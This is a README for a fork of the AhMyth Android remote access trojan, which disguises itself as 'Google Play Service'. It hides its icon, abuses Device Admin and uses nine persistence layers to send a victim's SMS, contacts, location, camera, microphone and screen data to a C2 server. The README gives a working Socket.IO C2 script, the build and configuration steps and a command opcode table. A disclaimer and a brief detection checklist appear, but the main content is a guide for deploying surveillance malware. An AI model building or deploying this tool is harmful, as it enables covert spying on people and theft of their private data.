# AhMyth Client — Android RAT (Remote Administration Tool)

> **⚠️ DISCLAIMER:** This software is designed for **educational and authorized testing purposes only**. Unauthorized access to computer systems or mobile devices is illegal. The authors assume no liability for misuse. Use only on devices you own or have explicit permission to test.

---

## 📋 Project Overview

This is an Android **RAT (Remote Access Trojan)** client, disguised as *"Google Play Service"*, that establishes a persistent WebSocket (Socket.IO) connection to a remote C2 (Command & Control) server. It demonstrates how Android malware operates in the wild — permission escalation, persistence mechanisms, data exfiltration, and device control.

**Built with:** Java + Kotlin • Socket.IO 2.0.1 • AndroidX • WorkManager • MediaProjection API

---

## 🏗 Architecture

```
┌─────────────┐     Socket.IO      ┌──────────────┐     WebSocket     ┌──────────────┐
│  Attacker   │ ──────────────────→│  C2 Server   │ ────────────────→│    Victim    │
│  (Dashboard)│ ←──────────────────│  (Node.js)   │ ←────────────────│    Device    │
└─────────────┘     Commands        └──────────────┘    Exfiltrated   └──────────────┘
                                                     Data
```

### Core Components

| Component | Role |
|-----------|------|
| `MainActivity` | Entry point; requests 13+ permissions; activates Device Admin; hides launcher icon |
| `MainService` | Foreground service ("Google Play Service" notification); starts Socket.IO connection |
| `ConnectionManager` | Command dispatch hub; routes incoming orders to manager classes |
| `IOSocket` | Singleton Socket.IO client with auto-reconnection |
| `CameraManager` | Capture photos (front/back camera via deprecated Camera API) |
| `MicManager` | Record audio for N seconds (MediaRecorder, AAC/MPEG-4) |
| `LocManager` | GPS/Network location tracking (lat/lng) |
| `SMSManager` | Read SMS inbox and send SMS messages |
| `CallsManager` | Read call logs (number, name, duration, type) |
| `ContactsManager` | Exfiltrate all saved contacts |
| `FileManager` | List directories and download files |
| `ScreenManager` | Capture screen via MediaProjection API → Base64 |
| `AppsListManager` | List all installed packages |
| `NotificationService` | Read all incoming notifications from any app |

---

## 🚀 Demo Setup Guide

### Prerequisites

1. **Android Studio** (Hedgehog 2023.1+ recommended)
2. **Java 17** (JDK 17)
3. An **Android device or emulator** (Android 7.0+ recommended, 11+ for full features)
4. A **C2 server** — you have three options:
   - **Option A:** Run the official AhMyth server (C# .NET application) — see [AhMyth-Server](https://github.com/AhMyth/AhMyth-Server)
   - **Option B:** Set up a minimal Socket.IO test server using the Node.js script below
   - **Option C:** Use a simple WebSocket echo server for connectivity testing only

### Interactive C2 Dashboard (Recommended)

This repo includes a **full interactive C2 dashboard** with a visual command interface, real-time response log, and device management — no manual Socket.IO scripting needed.

```bash
# 1. Install dependencies
npm install socket.io express

# 2. Start the server (serves dashboard + handles C2)
node .freebuff/c2-server.js

# 3. Open in browser
#    http://localhost:42474
```

**Files:**
- `.freebuff/c2-server.js` — Node.js server (Socket.IO + Express, serves dashboard)
- `.freebuff/c2-dashboard.html` — Interactive HTML dashboard with command buttons

![Dashboard features](https://via.placeholder.com/1x1?text=dashboard)

The dashboard provides:
- **Device panel** — see connected devices with model, manufacturer, Android version, ID
- **One-click commands** — buttons for SMS, camera, mic, location, contacts, screen capture, and more
- **Live response log** — all exfiltrated data appears in real-time with JSON formatting
- **Custom JSON input** — send arbitrary commands
- **Auto-scroll** and **log clearing**

### Minimal Socket.IO Test Server (alternative)

If you prefer a bare-bones terminal-only approach, use the minimal server:

```javascript
const server = require('http').createServer();
const io = require('socket.io')(server, { cors: { origin: '*' } });

io.on('connection', (socket) => {
  console.log('[+] Victim connected:', socket.handshake.query);
  socket.on('disconnect', () => console.log('[-] Disconnected'));

  // Log all exfiltrated data
  socket.on('x0000sm', (data) => console.log('[SMS]', JSON.stringify(data)));
  socket.on('x0000cl', (data) => console.log('[CALLS]', JSON.stringify(data)));
  socket.on('x0000cn', (data) => console.log('[CONTACTS]', JSON.stringify(data)));
  socket.on('x0000lm', (data) => console.log('[LOCATION]', JSON.stringify(data)));
  socket.on('x0000apps', (data) => console.log('[APPS]', JSON.stringify(data)));
});

server.listen(42474, '0.0.0.0', () => console.log('[C2 Server] Listening on port 42474'));
```

Run: `npm install socket.io express && node .freebuff/c2-server.js`

### 2. Configure the App

Edit `app/build.gradle` and update the `SOCKET_URL` field:

```groovy
buildConfigField "String", "SOCKET_URL", "\"http://192.168.1.100:42474\""
```

Replace `192.168.1.100` with your server's actual IP address.

### 3. Build & Install

```bash
./gradlew assembleDebug
```

Or build the APK directly from Android Studio: **Build → Build Bundle(s) / APK(s) → Build APK(s)**

### 4. Install & Demo

1. Install the APK on the target device/emulator
2. Open the app — it will appear as **"Google Play Service"**
3. Grant all requested permissions
4. The app will:
   - Activate Device Admin (lock/wipe/reboot capability)
   - Request screen capture permission
   - Hide its icon from the launcher
   - Start a foreground service (persistent notification)
   - Connect to your C2 server via Socket.IO
5. On the server terminal, you'll see connection logs and exfiltrated data

### Demo Commands (send from server)

| Event | Data | Effect |
|-------|------|--------|
| `{"order":"x0000sm","extra":"ls"}` | — | Exfiltrate all SMS messages |
| `{"order":"x0000cl"}` | — | Exfiltrate call logs |
| `{"order":"x0000cn"}` | — | Exfiltrate contacts |
| `{"order":"x0000lm"}` | — | Get GPS location |
| `{"order":"x0000apps"}` | — | List installed apps |
| `{"order":"x0000ca","extra":"0"}` | — | Take photo (front camera) |
| `{"order":"x0000mc","sec":5}` | — | Record 5 seconds of audio |

---

## 🔧 Fixed Bugs & Improvements

This fork includes the following fixes over the original codebase:

| # | Issue | Fix |
|---|-------|-----|
| 1 | Infinite recursion on connection failure | Added exponential backoff retry with max 10 attempts |
| 2 | `Looper.prepare()` crash on repeated calls | Added `Looper.myLooper() == null` guard |
| 3 | `wipeDevice()` emitted on wrong event name | Changed to correct `"x0000wipeDevice"` event |
| 4 | Cursor never closed in CallsManager | Added try-with-resources pattern with `finally` close |
| 5 | `FileManager.downloadFile()` OOM on large files | Added 20MB safety limit + chunked reading |
| 6 | `@RequiresApi(R)` blocking older devices | Removed annotation; all API guards are runtime |
| 7 | `IOSocket` eager singleton with NPE risk | Changed to lazy singleton with null-safe context access |

---

## 🛡 Persistence Mechanisms

The client uses **9 layers** of persistence to survive removal:

1. **Foreground Service** — ongoing notification prevents OOM kill
2. **START_STICKY** — Android auto-restarts the service
3. **WorkManager** — periodic restart every 15 minutes
4. **Boot Receiver** — restarts on device power-on
5. **Task Removal** — re-launches itself when swiped from recents
6. **Wake Lock** — keeps CPU running during screen-off
7. **Battery Optimization Bypass** — prevents doze mode
8. **Icon Hiding** — removed from app drawer
9. **Device Admin** — prevents uninstallation without multi-step deactivation

---

## 📚 Academic Relevance

This project demonstrates the following cybersecurity concepts:

- **Permission escalation attacks** (Android permission model weaknesses)
- **C2 communication** (WebSocket-based real-time command & control)
- **Data exfiltration** (SMS, contacts, location, media, files)
- **Persistence techniques** (foreground services, broadcast receivers, WorkManager)
- **Evasion methods** (icon hiding, fake app name, runtime permission harvesting)
- **Device admin abuse** (lock, wipe, reboot without user interaction beyond initial grant)
- **Defensive forensics** (indicators of compromise, detection heuristics)

---

## 🔍 Defensive Detection Checklist

To check if a device is infected:

- [ ] Check **Settings → Apps** for "Google Play Service"
- [ ] Review **Device Admin apps** for unknown entries
- [ ] Check **Notification Access** for suspicious listeners
- [ ] Review **Battery Optimization exceptions** for unknown apps
- [ ] Check **Overlay permission** grants
- [ ] Monitor for unusual **data usage** (persistent WebSocket traffic)
- [ ] Search for `x0000` opcode patterns in network traffic

---

## 🤝 Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed documentation on:

- **Architecture deep dive** — component lifecycle, data flow, class responsibilities
- **Codebase organization** — full file tree with descriptions
- **Development setup** — prerequisites, first-time build, dashboard server
- **C2 protocol specification** — transport, URL construction, command/response formats, complete opcode table
- **Adding a new command** — step-by-step guide with code examples for creating manager modules, dispatching commands, adding permissions, and dashboard integration
- **Modifying the C2 dashboard** — Socket.IO event reference, adding tabs, visual response handlers
- **Testing guidelines** — unit test patterns, manual checklist, coverage priorities
- **Code style guide** — Java/Kotlin conventions, naming, formatting
- **Pull request process** — workflow, checklist, commit message format
- **Known issues & roadmap** — current limitations, prioritized feature list
